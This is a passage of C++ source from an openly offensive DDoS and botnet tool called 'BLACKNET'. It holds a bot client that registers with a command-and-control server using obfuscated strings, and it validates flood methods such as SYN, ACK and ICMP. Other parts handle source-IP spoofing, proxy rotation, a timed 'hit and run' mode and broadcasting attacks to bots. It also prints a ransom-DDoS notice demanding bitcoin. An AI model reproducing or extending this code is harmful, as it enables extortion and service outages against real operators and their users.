#else
            "Unknown";
#endif
        string handshake = OBF("BLACKNET_BOT").decrypt() + "\n" +
                           OBF("VERSION:").decrypt() + "2.0\n" +
                           OBF("OS:").decrypt() + os_name + "\n" +
                           OBF("PORT:").decrypt() + to_string(bot_port) + "\n\n";
        send(c2_sock, handshake.data(), handshake.size(), 0);

        cout << "[+] Registered as bot. Waiting for commands..." << endl;

        bot_command_loop(c2_sock, true, c2_addr, handshake);
        cout << "[+] Bot client shutting down." << endl;
        return 0;
    }

    bool has_target = (optind < argc);
    if (has_target) {
        target = argv[optind];
    }

    bool has_bot_ops = !load_bots_file.empty() ||
                       !add_bot_list.empty() || !remove_bot_id.empty() ||
                       list_bots_flag || !save_bots_file.empty() ||
                       !scan_network_cidr.empty();

    if (!has_target && !has_bot_ops) {
        cerr << "[-] Error: Target not specified" << endl;
        print_usage();
        return 1;
    }

    if (has_target) {
        if (port < 1 || port > 65535) {
            cerr << "[-] Error: Invalid port number" << endl;
            return 1;
        }

        if (threads < 1 || threads > 10000) {
            cerr << "[-] Error: Invalid thread count" << endl;
            return 1;
        }

        if (rate < 1 || rate > 1000000) {
            cerr << "[-] Error: Invalid rate" << endl;
            return 1;
        }

        if (packet_size < 1 || packet_size > 65535) {
            cerr << "[-] Error: Invalid packet size" << endl;
            return 1;
        }

        if (!country.empty()) {
            cout << "[+] Geo-targeting country: " << country << endl;
        }

        int method_idx = get_attack_method_index(method);
        if (method_idx < 0) {
            cerr << "[-] Error: Unknown method '" << method << "'" << endl;
            print_method_list();
            return 1;
        }

        if (!Utilities::is_root() && (method == "syn" || method == "ack" || method == "icmp")) {
            cerr << "[-] Error: " << method << " attack requires root privileges" << endl;
            return 1;
        }
    }

    if (!target.empty()) {
        cout << "[+] Target: " << target << ":" << port << endl;
        cout << "[+] Method: " << method << " (" << get_method_description(method) << ")" << endl;
        cout << "[+] Threads: " << threads << endl;
        cout << "[+] Rate: " << rate << " pps" << endl;
        cout << "[+] Packet size: " << packet_size << " bytes" << endl;
        if (duration > 0) {
            cout << "[+] Duration: " << duration << " seconds" << endl;
        } else {
            cout << "[+] Duration: infinite" << endl;
        }
        if (packet_limit > 0) {
            cout << "[+] Packet limit: " << Utilities::format_number(packet_limit) << endl;
        }
        if (data_limit > 0) {
            cout << "[+] Data limit: " << Utilities::format_bytes(data_limit) << endl;
        }
        if (random_source) {
            cout << "[+] Source IP randomization: enabled" << endl;
        }
        if (random_port) {
            cout << "[+] Source port randomization: enabled" << endl;
        }
        if (!proxy_file.empty()) {
            cout << "[+] Proxy file: " << proxy_file << endl;
        }
        if (use_proxy) {
            cout << "[+] Proxy rotation: enabled" << endl;
        } else {
            cout << "[+] Proxy rotation: disabled" << endl;
        }
        cout << "\n";
    }

    if (rdos_mode && has_target) {
        string target_str = target + ":" + to_string(port);
        cout << "\n  ╔══════════════════════════════════════════════════════════════╗" << endl;
        cout << "  ║               RANSOM DDoS NOTICE                            ║" << endl;
        cout << "  ╠══════════════════════════════════════════════════════════════╣" << endl;
        cout << "  ║  Your services at " << left << setw(37) << target_str << "║" << endl;
        cout << "  ║  are under DDoS attack.                                      ║" << endl;
        cout << "  ║                                                              ║" << endl;
        cout << "  ║  To stop the attack, send 0.01 BTC to:                       ║" << endl;
        cout << "  ║  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh                ║" << endl;
        cout << "  ║                                                              ║" << endl;
        cout << "  ║  Contact: ransom@blacknet.onion                              ║" << endl;
        cout << "  ║  Deadline: 48 hours before escalation                        ║" << endl;
        cout << "  ╚══════════════════════════════════════════════════════════════╝" << endl;
        cout << "\n[!] Attack commencing in 5 seconds..." << endl;
        this_thread::sleep_for(chrono::seconds(5));
    }

    if (!hit_run_param.empty() && has_target) {
        int attack_sec = 30;
        int sleep_sec = 10;
        int cycles = 0;
        size_t col1 = hit_run_param.find(':');
        if (col1 != string::npos) {
            attack_sec = stoi(hit_run_param.substr(0, col1));
            size_t col2 = hit_run_param.find(':', col1 + 1);
            if (col2 != string::npos) {
                sleep_sec = stoi(hit_run_param.substr(col1 + 1, col2 - col1 - 1));
                cycles = stoi(hit_run_param.substr(col2 + 1));
            } else {
                sleep_sec = stoi(hit_run_param.substr(col1 + 1));
            }
        }

        cout << "[+] Hit & Run mode: attack " << attack_sec << "s, sleep " << sleep_sec << "s";
        if (cycles > 0) {
            cout << ", " << cycles << " cycles";
        }
        cout << endl;

        int cycle = 0;
        while (running && (cycles <= 0 || cycle < cycles)) {
            cout << "\n[+] Hit & Run cycle " << (cycle + 1);
            if (cycles > 0) {
                cout << "/" << cycles;
            }
            cout << endl;

            AttackEngine::AttackConfig config;
            config.target = target;
            config.port = port;
            config.method = method;
            config.threads = threads;
            config.rate = rate;
            config.packet_size = packet_size;
            config.random_source = random_source;
            config.random_port = random_port;
            config.ip_version = ip_version;
            config.packet_limit = packet_limit;
            config.data_limit = data_limit;
            config.duration = attack_sec;
            config.proxy_manager = use_proxy ? &proxy_manager : nullptr;
            config.use_tls = is_tls_method(method);

            attack_engine_local.start_attack(config);

            this_thread::sleep_for(chrono::seconds(attack_sec));

            attack_engine_local.stop_attack();
            if (!running) break;

            if (sleep_sec > 0) {
                cout << "[+] Sleeping for " << sleep_sec << "s..." << endl;
                this_thread::sleep_for(chrono::seconds(sleep_sec));
            }
            cycle++;
        }

        cout << "\n[+] Hit & Run completed!" << endl;
        return 0;
    }

    if (use_botnet) {
        cout << "[+] Starting in botnet mode..." << endl;

        if (!c2_server.empty()) {
            size_t colon_pos = c2_server.find(':');
            if (colon_pos != string::npos) {
                string server = c2_server.substr(0, colon_pos);
                int c2port = stoi(c2_server.substr(colon_pos + 1));
                bot_manager_local.set_c2_server(server, c2port);
                cout << "[+] C2 server: " << server << ":" << c2port << endl;
            } else {
                bot_manager_local.set_c2_server(c2_server, 80);
                cout << "[+] C2 server: " << c2_server << ":80" << endl;
            }
        }

        int waited = 0;
        int connected = bot_manager_local.connected_count();
        while (connected == 0 && waited < 10) {
            cout << "[*] Waiting for bot connections... (" << (10 - waited) << "s left)" << endl;
            this_thread::sleep_for(chrono::seconds(1));
            connected = bot_manager_local.connected_count();
            waited++;
        }

        connected = bot_manager_local.connected_count();
        if (connected > 0) {
            cout << "[+] Broadcasting attack to " << connected << " connected bots" << endl;
            bot_manager_local.start_ddos(target, port, method, duration, rate);
        } else {
            cout << "[!] No bots connected." << endl;
        }

        cout << "[+] C2 attacking locally as well" << endl;
        AttackEngine::AttackConfig config;
        config.target = target;
        config.port = port;
        config.method = method;
        config.threads = threads;
        config.rate = rate;
        config.packet_size = packet_size;
        config.random_source = random_source;
        config.random_port = random_port;
        config.ip_version = ip_version;
        config.packet_limit = packet_limit;
        config.data_limit = data_limit;
        config.duration = duration;
        config.proxy_manager = use_proxy ? &proxy_manager : nullptr;
        config.use_tls = is_tls_method(method);

        attack_engine_local.start_attack(config);

        if (duration > 0) {
            cout << "[+] Attack running for " << duration << " seconds..." << endl;
            this_thread::sleep_for(chrono::seconds(duration));
            attack_engine_local.stop_attack();
            bot_manager_local.stop_ddos();
        } else {
            cout << "[+] Attack running indefinitely. Press Ctrl+C to stop." << endl;
            while (running) {
                this_thread::sleep_for(chrono::seconds(1));
            }
        }

        auto stats = attack_engine_local.get_stats();
        cout << "\n--- Attack complete ---" << endl;
        cout << "  " << Utilities::format_number(stats.packets_sent) << " pkts, "
             << Utilities::format_bytes(stats.bytes_sent) << ", "
             << Utilities::format_bps(stats.peak_bps) << " peak" << endl;

        return 0;
    }

    if (!has_target) {
        return 0;
    }

    int method_idx = get_attack_method_index(method);
    if (method_idx < 0) {
        cerr << "[-] Error: Unknown method '" << method << "'" << endl;
        print_method_list();
        return 1;
    }

    cout << "[+] Starting attack: " << method << " -> " << target << ":" << port
         << " (" << threads << " threads, " << rate << " pps)" << endl;
    if (packet_limit > 0) {
        cout << "[+] Packet limit: " << Utilities::format_number(packet_limit) << endl;
    }
    if (data_limit > 0) {
        cout << "[+] Data limit: " << Utilities::format_bytes(data_limit) << endl;
    }
    if (duration > 0) {
        cout << "[+] Duration: " << duration << "s" << endl;
    }
    cout << "\n";

    AttackEngine::AttackConfig config;
    config.target = target;
    config.port = port;
    config.method = method;
    config.threads = threads;
    config.rate = rate;
    config.packet_size = packet_size;
    config.random_source = random_source;
    config.random_port = random_port;
    config.ip_version = ip_version;
    config.packet_limit = packet_limit;
    config.data_limit = data_limit;
    config.duration = duration;
    config.proxy_manager = use_proxy ? &proxy_manager : nullptr;
    config.use_tls = is_tls_method(method);

    attack_engine_local.start_attack(config);

    auto start_time = chrono::steady_clock::now();

    while (running) {
        this_thread::sleep_for(chrono::seconds(1));

        auto now = chrono::steady_clock::now();
        auto elapsed = chrono::duration_cast<chrono::seconds>(now - start_time).count();

        if (duration > 0 && elapsed >= duration) {
            cout << "\n[+] Attack duration reached. Stopping..." << endl;
            break;
        }

        if (!attack_engine_local.is_running()) {
            auto stats = attack_engine_local.get_stats();
            if (packet_limit > 0 && stats.packets_sent >= packet_limit) {
                cout << "\n[+] Packet limit reached. Stopping..." << endl;
            } else if (data_limit > 0 && stats.bytes_sent >= data_limit) {
                cout << "\n[+] Data limit reached. Stopping..." << endl;
            } else {
                cout << "\n[+] Attack stopped." << endl;
            }
            break;
        }

        if (show_stats || verbose) {
            auto stats = attack_engine_local.get_stats();
            cout << "\r  " << elapsed << "s "
                 << Utilities::format_number(stats.packets_sent) << " pkts "
                 << Utilities::format_bytes(stats.bytes_sent) << " "
                 << Utilities::format_bps(stats.current_bps) << "         " << flush;
        }
    }

    attack_engine_local.stop_attack();

    if (show_stats || verbose) {
        cout << endl;
        print_stats(attack_engine_local);
    }

    cout << "\n[+] Attack completed!" << endl;

    return 0;
}
